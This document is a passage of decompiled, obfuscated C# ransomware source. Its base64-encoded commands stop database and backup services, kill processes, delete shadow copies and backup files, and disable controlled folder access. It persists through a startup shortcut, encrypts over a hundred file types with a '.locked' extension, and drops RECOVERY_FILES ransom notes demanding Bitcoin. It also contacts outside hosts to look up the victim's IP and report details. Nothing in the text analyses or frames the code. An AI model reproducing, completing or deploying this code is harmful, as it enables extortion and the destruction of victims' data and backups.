		tRvIdsqgaYol("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		tRvIdsqgaYol("c3RvcCBzd2lfdXBkYXRlIC95"),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		tRvIdsqgaYol("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		tRvIdsqgaYol("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		tRvIdsqgaYol("c3RvcCBUbUNDU0YgL3k="),
		tRvIdsqgaYol("c3RvcCBTUUxCcm93c2VyIC95"),
		tRvIdsqgaYol("c3RvcCB0bWxpc3RlbiAveQ=="),
		tRvIdsqgaYol("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		tRvIdsqgaYol("c3RvcCBUcnVlS2V5IC95"),
		tRvIdsqgaYol("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		tRvIdsqgaYol("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		tRvIdsqgaYol("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		tRvIdsqgaYol("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		tRvIdsqgaYol("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		tRvIdsqgaYol("c3RvcCBXUlNWQyAveQ=="),
		tRvIdsqgaYol("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		tRvIdsqgaYol("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> ceSdfuTonwHEcGO = new List<string>
	{
		tRvIdsqgaYol("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		tRvIdsqgaYol("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		tRvIdsqgaYol("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		tRvIdsqgaYol("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> vNolTCrpLqpRKU = new List<string>
	{
		tRvIdsqgaYol("L0lNIG1zcHViLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIG15c3FsZC5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIGFnbnRzdmMuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIHRoZWJhdC5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIGVuY3N2Yy5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIENOVEFvU01nci5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIGRiZW5nNTAuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIG9jb21tLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIHpvb2x6LmV4ZSAvRg=="),
		tRvIdsqgaYol("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIGRic25tcC5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIG1zcHViLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIG9uZW5vdGUuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIG91dGxvb2suZXhlIC9G"),
		tRvIdsqgaYol("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIHZpc2lvLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIHdpbndvcmQuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIHdvcmRwYWQuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIG9jc3NkLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIG9yYWNsZS5leGUgL0Y="),
		tRvIdsqgaYol("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		tRvIdsqgaYol("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		tRvIdsqgaYol("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> kcPYHytTJYeikwQ = new List<string>
	{
		tRvIdsqgaYol("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		tRvIdsqgaYol("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		tRvIdsqgaYol("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> BfAttCbuBT = new List<string>
	{
		tRvIdsqgaYol("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		tRvIdsqgaYol("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		tRvIdsqgaYol("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		tRvIdsqgaYol("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		tRvIdsqgaYol("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		tRvIdsqgaYol("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string qymkPyxwaztP = "NO";

	public static string AarVmeKSlLb = "NO";

	internal static DateTime yFsqkRwmGnaOANyj = new DateTime(2000, 1, 1);

	internal static DateTime MhKLbpxIHIiyx = new DateTime(2100, 1, 1);

	public static string jxOoqhbcgtBZFv = "YES";

	public static string qVisayOOulGyyq = "10";

	public static string DDTmQtANrPHQ = "NO";

	public static string PYkWNWTUuLQ = "NO";

	public static string uwjgmXJFHzIYa = "NO";

	public static string PIfbhpUlSphc = "YES";

	public static string iySuoeKhcZlw = "NO";

	public static string ZwDUufGDCysrvCb = "NO";

	public static List<string> jjGwgfQeXEgM = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string SJciSWANwLpZd = "NO";

	public static string XyJXNRlVrpoE = "1";

	public static string uGfUPZRjCOBK = "YES";

	public static string HedkgVXHnX = "NO";

	public static string mLdXizxETCFqA = "NO";

	public static string LmBUrvDrrTdzdQ = string.Empty;

	public static string HOfgHhixvyoK = "NO";

	public static string riTSySHcniS = "YES";

	public static string MJxeIPcrbE = "YES";

	public static string OIPPAJLKoE = "RU5DUllQVEVE";

	public static string ruMxPpWxiDaDaN = "UkVBRCBSRUNPVkVSWV9GSUxFUyBPTiBERVNLVE9Q";

	public static string hMKixhUyBLT = "NO";

	public static string HantOYbrAOqrBd = "YES";

	public static string uLOfmffuUbO = "NO";

	public static string VTOoqslyMwRbJR = "NO";

	public static string GRUwKwKntfLtCWK = "NO";

	public static string eLnEJSaXiAoJ = "LOGONISOFF";

	public static string grxsZmwxevjU = "NO";

	public static string xiRqXSDLLeD = "NO";

	public static string hyxqjtznsfKrwU = "mystartup.lnk";

	public static string RoXIZDFvccqVq = "NO";

	public static string uLlZbDdZLd = "NO";

	public static string IYsWOfsIHjISM = "NO";

	public static string itFjiDWqgS = "NO";

	public static string seVIVtnfPDeH = "VGhhbm9z";

	public static string HIbggaLKHhy = "YES";

	public static string DTNdQXUQFZm = "NO";

	public static string KCfQiUVproeS = "NO";

	public static string hWsvAkLnTz = "NO";

	public static string[] RRJjnVREECsyf = new string[0];

	public static string AbkRtlPjZlew = "NO";

	public static bool nXWsyPPQaMQrM = true;

	public static List<string> XqIzlcdHQsHhv = new List<string>();

	public static List<string> kGkgAJTDjCeUgewp = new List<string>();

	public static List<string> RTAgHQTZSwgUsR = new List<string>();

	private static void Main(string[] args)
	{
		try
		{
			pNWNKzyKwWyRkSk.vKMoxHKNOChwQ(tMBqsPrhcJ);
		}
		catch (Exception)
		{
		}
		try
		{
			if (HIbggaLKHhy == "YES")
			{
				Thread thread = new Thread(nJxsYhxVShqqL.tOvyOYtrZTQCOs);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (iamMVuyXVE == "YES")
		{
			Thread.Sleep(int.Parse(JuWoZYSBZswKhn));
		}
		if (uGfUPZRjCOBK == "YES")
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					string[] kvtbUdpYRDQQEi = new string[4]
					{
						tRvIdsqgaYol("VGFza21ncg=="),
						tRvIdsqgaYol("dGFza21ncg=="),
						tRvIdsqgaYol("UHJvY2Vzc0hhY2tlcg=="),
						tRvIdsqgaYol("cHJvY2V4cA==")
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						VIqeDgTaFytwA.LVNtphQMYcbo(kvtbUdpYRDQQEi);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				UOvDUGDcIsWrO.nouWtNijdNX(tRvIdsqgaYol("dGFza21ncg=="));
			}
			catch
			{
			}
			try
			{
				UOvDUGDcIsWrO.nouWtNijdNX(tRvIdsqgaYol("cHJvY2V4cA=="));
			}
			catch
			{
			}
			try
			{
				UOvDUGDcIsWrO.nouWtNijdNX(tRvIdsqgaYol("cHJvY2V4cDY0"));
			}
			catch
			{
			}
			try
			{
				UOvDUGDcIsWrO.nouWtNijdNX(tRvIdsqgaYol("UHJvY2Vzc0hhY2tlcg=="));
			}
			catch
			{
			}
			Thread thread3 = new Thread(VIqeDgTaFytwA.StKhoxFsnmI);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && iySuoeKhcZlw == "YES")
		{
			try
			{
				vayuAHRHzp(tRvIdsqgaYol("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		if (vLCPxvOFhStADi == "YES" && !GtGubEhkBUXwa.ilMBflUuabHCSp())
		{
			GtGubEhkBUXwa.wgqOPcDBTPcx();
		}
		if (oEvTOxSckImq == "YES" && GtGubEhkBUXwa.ilMBflUuabHCSp())
		{
			new hlCTylgyWeaD().LcxbHqjHFUe(KtUIKdCixyJmlPsXA: false);
			new hlCTylgyWeaD().UmXCqECkXcWekDJTZP();
		}
		if (hzESjFSCFCQG == "YES")
		{
			xmyBcDDNRFAN.gHSSrapllIOy();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (BrnILUGcSDPVh == "YES" && fileName != text2)
		{
			Thread thread4 = new Thread(avFSOWiRbvP);
			thread4.IsBackground = true;
			thread4.Priority = ThreadPriority.Normal;
			thread4.Start();
		}
		if (xGUqmRVTnGlzAt == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				PydHXcNWICPd = BFykecDbreqKJ(0, qylgWMXZJbFlMp.Count);
				File.Copy(fileName, text + qylgWMXZJbFlMp[PydHXcNWICPd], overwrite: true);
				Process.Start(text + qylgWMXZJbFlMp[PydHXcNWICPd]);
				dBJeYmPfKaJT();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (qymkPyxwaztP == "YES" && DateTime.Now < yFsqkRwmGnaOANyj)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (AarVmeKSlLb == "YES" && DateTime.Now > MhKLbpxIHIiyx)
			{
				dBJeYmPfKaJT();
			}
		}
		catch
		{
		}
		Thread thread5 = new Thread((ThreadStart)delegate
		{
			foreach (string item in AvzQMcUuTqVuYAb)
			{
				wRzEVCtsszv("net.exe", item);
			}
			foreach (string item2 in ceSdfuTonwHEcGO)
			{
				wRzEVCtsszv("sc.exe", item2);
			}
			foreach (string item3 in vNolTCrpLqpRKU)
			{
				wRzEVCtsszv(tRvIdsqgaYol("dGFza2tpbGwuZXhl"), item3);
			}
			if (hWsvAkLnTz == "YES")
			{
				string[] rRJjnVREECsyf = RRJjnVREECsyf;
				foreach (string text4 in rRJjnVREECsyf)
				{
					wRzEVCtsszv(tRvIdsqgaYol("dGFza2tpbGwuZXhl"), "/IM " + text4 + " /f");
				}
			}
			foreach (string item4 in kcPYHytTJYeikwQ)
			{
				wRzEVCtsszv(tRvIdsqgaYol("dnNzYWRtaW4uZXhl"), item4);
			}
			foreach (string item5 in BfAttCbuBT)
			{
				wRzEVCtsszv(tRvIdsqgaYol("ZGVsLmV4ZQ=="), item5);
			}
		});
		thread5.Priority = ThreadPriority.Normal;
		thread5.Start();
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				Thread thread6 = new Thread(jcoQEPyCKXH.fTZNfbSDJCWcn);
				thread6.IsBackground = true;
				thread6.Start();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			wRzEVCtsszv("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin");
		}
		if (SgdnDdHIiKPpqsIk == "YES" && OLxYldnGupA() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread7 = new Thread(OHkFEexVuUw.jUcuzPteWhFoDHj);
			thread7.IsBackground = true;
			thread7.Priority = ThreadPriority.Normal;
			thread7.Start();
		}
		_ = dxRbMtajUQT == "YES";
		if (DDTmQtANrPHQ == "NO")
		{
			LMmzQuHrwNi = HWroTCnpSCZhm.rQnxyAisXya(32);
		}
		else
		{
			LMmzQuHrwNi = "B7QMKDL98AM445CA53S3036URQURENSY";
		}
		string text3 = vwzYQbnjYl.woKUZohsnyqTJGOm(LMmzQuHrwNi);
		if (riTSySHcniS == "YES")
		{
			AREPahaRXZVb();
		}
		IfLOoLTZfyNo.gRBMeBwJtM(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), hyxqjtznsfKrwU), OACjvwclUmb(text3), null, null, "Installer...", "Ctrl+Shift+X", null);
		if (HantOYbrAOqrBd == "YES")
		{
			try
			{
				MSpdPfaUgkT();
			}
			catch
			{
			}
		}
		try
		{
			uWDwsznMJad(new string[1] { "[auto]" }, new string[110]
			{
				"db", "dbf", "accdb", "dbx", "mdb", "mdf", "epf", "ndf", "ldf", "1cd",
				"sdf", "nsf", "fp7", "cat", "log", "dat", "txt", "jpeg", "gif", "jpg",
				"png", "php", "cs", "cpp", "rar", "zip", "html", "htm", "xlsx", "xls",
				"avi", "mp4", "ppt", "doc", "docx", "sxi", "sxw", "odt", "hwp", "tar",
				"bz2", "mkv", "eml", "msg", "ost", "pst", "edb", "sql", "odb", "myd",
				"php", "java", "cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr",
				"gpg", "aes", "vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk",
				"vdi", "lay6", "sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup",
				"pdf", "cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb",
				"pptx", "mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv",
				"sql", "ora", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z", "anom"
			}, new string[0], LMmzQuHrwNi, ".locked");
		}
		catch
		{
		}
		LMmzQuHrwNi = HWroTCnpSCZhm.rQnxyAisXya(32);
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.txt");
				streamWriter.WriteLine(tRvIdsqgaYol("QWxsIGZpbGVzIGFyZSBlbmNyeXBlZCBhbmQgdXBsb2FkZWQgdG8gYSBzZXJ2ZXIuDQoNClRvIGF2b2lkICBsb29zZSBhbnkgb2YgeW91ciBmaWxlcyBhbmQgbGVha3MuIFBsZWFzZSBmb2xsb3cgaW5zdHJ1Y3Rpb25zLg0KDQpQYXltZW50IG9mIDAuMDUgQlRDIHRvIHRoZSBhZHJlc3MgdW5kZXJuZWF0aA0KDQpZb3UgY2FuIGJ1eSBiaXRjb2luIGhlcmU6DQoNCmxpdGViaXQuZXUNCmJpdG9uaWMubmwNCg0KQlRDIEFkcmVzczoNCg0KMUNOWm90a3ZMZ2hFUkM4eGNRSE1kdG51c0Jib0hERmdoeA0KDQpBZnRlciBwYXltZW50IGNvbnRhY3QgbWUgb24gbXkgbWFpbCBvciB0ZWxlZ3JhbS4NCg0KQ29udGFjdDogdGhlX3VuZGVydGFrZXI2MEBwcm90b25tYWlsLmNvbQ0KVGVsZWdyYW06IHRoZV91bmRlcnRha2VyNjA="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(tRvIdsqgaYol("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(text3);
				if (fWvfvRzLwhw == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(tRvIdsqgaYol("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(PhPfWbXuhz.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.txt", "\r\nAditional KeyId:\r\n" + text3);
			}
		}
		catch
		{
		}
		foreach (string item6 in CXucXEXIeDykT)
		{
			try
			{
				if (item6 == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item6 + "\\RECOVERY_FILES.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.txt", item6 + "\\RECOVERY_FILES.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(item6 + "\\RECOVERY_FILES.txt", "\r\nAditional KeyId:\r\n" + text3);
				}
			}
			catch (Exception)
			{
			}
		}
		if (IYsWOfsIHjISM == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.hta");
					streamWriter2.WriteLine(tRvIdsqgaYol("MESSAGERICH"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(tRvIdsqgaYol("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(text3 + tRvIdsqgaYol("PC9wPg=="));
					if (fWvfvRzLwhw == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(tRvIdsqgaYol("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + tRvIdsqgaYol("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(PhPfWbXuhz.Count) + tRvIdsqgaYol("PC9wPg=="));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.hta", tRvIdsqgaYol("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + text3 + tRvIdsqgaYol("PC9wPg=="));
				}
			}
			catch
			{
			}
		}
		if (weoafCbZLH == "YES")
		{
			try
			{
				if (fWvfvRzLwhw == "NO")
				{
					FFdxwtHSrgOu.ZHclFxzroOwJBCC("URL", "USERNAME", "ACCESO", tRvIdsqgaYol("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(tRvIdsqgaYol("aHR0cDovL2ljYW5oYXppcC5jb20=")) + tRvIdsqgaYol("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + tRvIdsqgaYol("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(PhPfWbXuhz.Count) + "\r\n" + tRvIdsqgaYol("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(PhPfWbXuhz) + "\r\n" + tRvIdsqgaYol("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
				else
				{
					FFdxwtHSrgOu.ZHclFxzroOwJBCC("URL", "USERNAME", "ACCESO", tRvIdsqgaYol("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + tRvIdsqgaYol("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + tRvIdsqgaYol("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(PhPfWbXuhz) + "\r\n" + tRvIdsqgaYol("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
			}
			catch
			{
			}
		}
		if (NkKzftIrHmxDtq == "YES")
		{
			try
			{
				IjCNGWkEdGsDqk.HtoxKGsdNdZq(new Uri("aHR0cDovLzIwOS4xODIuMjE3LjE1OC84M2VjNjVkYWMzZTgyZDBjNDY5YWQ5MzE4NDZlZTAwMy5qcGc="));
			}
			catch
			{
			}
		}
		if (IYsWOfsIHjISM == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.txt"))
				{
					Process.Start(tRvIdsqgaYol("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.hta"))
				{
					Process.Start(tRvIdsqgaYol("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RECOVERY_FILES.hta");
				}
			}
			catch
			{
			}
		}
		if (riTSySHcniS == "YES")
		{
			if (MJxeIPcrbE == "YES" && !string.IsNullOrEmpty(OIPPAJLKoE) && !string.IsNullOrEmpty(ruMxPpWxiDaDaN))
			{
				PHzbXoGcleR(OIPPAJLKoE, ruMxPpWxiDaDaN);
			}
			else
			{
				PHzbXoGcleR();
			}
		}
		if (eLnEJSaXiAoJ != "LOGONISOFF")
		{
			WquuTgaNFfMh(eLnEJSaXiAoJ);
		}
		if (!string.IsNullOrEmpty(LmBUrvDrrTdzdQ))
		{
			try
			{
				File.Delete(LmBUrvDrrTdzdQ);
			}
			catch
			{
			}
		}
		if (UPUQwcTKGUAFdV == "EVET")
		{
			dBJeYmPfKaJT();
		}
	}

	public static void avFSOWiRbvP()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(tRvIdsqgaYol("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), tRvIdsqgaYol("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int BFykecDbreqKJ(int BRxkxKdOXTdbQSP, int OWtMdTgSeGOaB)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(BRxkxKdOXTdbQSP, OWtMdTgSeGOaB);
	}

	public static List<string> HxHYEVqAvVuJvTvN(string gfLartFeZC, string[] rVufDDPSQKQ, string DPEEeVouCFnU, string[] kztnzpFoYtEyKGD, string CtpZupuhdiOkGq)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(gfLartFeZC);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata"))
				{
					array = Directory.GetFiles(text);
